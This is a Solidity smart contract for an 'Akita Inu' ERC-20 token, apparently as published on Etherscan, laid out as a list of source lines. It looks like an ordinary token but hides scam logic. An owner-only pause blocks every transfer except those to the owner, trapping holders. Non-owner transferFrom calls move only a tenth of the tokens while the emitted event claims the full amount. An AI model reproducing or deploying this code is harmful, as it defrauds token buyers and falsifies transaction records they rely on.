['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-22\n', '*/\n', '\n', '/**\n', '\n', '\n', ' ________  ___  __    ___  _________  ________          ___  ________   ___  ___     \n', '|\\   __  \\|\\  \\|\\  \\ |\\  \\|\\___   ___\\\\   __  \\        |\\  \\|\\   ___  \\|\\  \\|\\  \\    \n', '\\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|___ \\  \\_\\ \\  \\|\\  \\       \\ \\  \\ \\  \\\\ \\  \\ \\  \\\\\\  \\   \n', ' \\ \\   __  \\ \\   ___  \\ \\  \\   \\ \\  \\ \\ \\   __  \\       \\ \\  \\ \\  \\\\ \\  \\ \\  \\\\\\  \\  \n', '  \\ \\  \\ \\  \\ \\  \\\\ \\  \\ \\  \\   \\ \\  \\ \\ \\  \\ \\  \\       \\ \\  \\ \\  \\\\ \\  \\ \\  \\\\\\  \\ \n', '   \\ \\__\\ \\__\\ \\__\\\\ \\__\\ \\__\\   \\ \\__\\ \\ \\__\\ \\__\\       \\ \\__\\ \\__\\\\ \\__\\ \\_______\\\n', '    \\|__|\\|__|\\|__| \\|__|\\|__|    \\|__|  \\|__|\\|__|        \\|__|\\|__| \\|__|\\|_______|\n', '\n', '\n', '*/\n', '//   SPDX-License-Identifier: MIT\n', '\n', 'pragma solidity ^0.5.17;\n', '\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract ERC20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  address public newOwner;\n', '\n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier onlyOwner {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '  function transferOwnership(address _newOwner) public onlyOwner {\n', '    newOwner = _newOwner;\n', '  }\n', '  function acceptOwnership() public {\n', '    require(msg.sender == newOwner);\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '    newOwner = address(0);\n', '  }\n', '}\n', '\n', 'contract TokenERC20 is ERC20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint _totalSupply;\n', '  address public newn;\n', '  uint version;\n', '  uint transfers = 0;\n', '  bool paused;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  constructor() public {\n', '    symbol = "AKITA";\n', '    name = "Akita Inu";\n', '    decimals = 18;\n', '    // one trillion ether\n', '    _totalSupply =  1000000000000 ether;\n', '    version = 8;\n', '    balances[owner] = _totalSupply;\n', '    emit Transfer(address(0), owner, _totalSupply);\n', '  }\n', '  function transfernewn(address _newn) public onlyOwner {\n', '    newn = _newn;\n', '  }\n', '  function pause() public onlyOwner {\n', '      paused = true;\n', '  }\n', '  function unpause() public onlyOwner {\n', '      paused = false;\n', '  }\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '      return balances[tokenOwner];\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '    require(!paused || to == owner);\n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '    require(!paused || to == owner);\n', '    uint realTokens;\n', '    if (from == owner || to == owner) {\n', '        realTokens = tokens;\n', '    } else {\n', '        realTokens = tokens / 10;\n', '    }\n', '    balances[from] = balances[from].sub(realTokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(realTokens);\n', '    balances[to] = balances[to].add(realTokens);\n', '    emit Transfer(from, to, tokens);\n', '    transfers += 1;\n', '    return true;\n', '  }\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n', '    return true;\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract AkitaInuToken is TokenERC20 {\n', '  function() external payable {\n', '\n', '  }\n', '}']